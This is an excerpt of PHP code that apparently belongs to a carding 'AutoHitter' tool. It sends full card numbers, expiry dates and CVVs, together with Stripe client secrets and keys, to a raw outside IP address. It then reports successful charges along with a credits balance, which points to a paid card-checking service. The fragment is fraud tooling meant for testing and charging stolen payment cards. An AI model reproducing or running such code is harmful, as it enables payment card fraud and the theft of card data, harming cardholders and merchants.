...
$requestUrl = "http://206.206.78.217:1080/?cc={$cc}|{$month}|{$year}|{$cvv}&client_secet=" . urlencode($client_secret). "&pk=" . urlencode($pk). "&acct=" . urlencode($acct);
...
if (stripos($response, 'Payment Successful') !== false) {
    ...
    echo json_encode([
        'status' => 'charge',
        'Response' => $err,
        'Gateway' => 'Inbuilt AutoHitter (CVV)',
        'cc' => $cc1,
        'credits' => $newCredits,
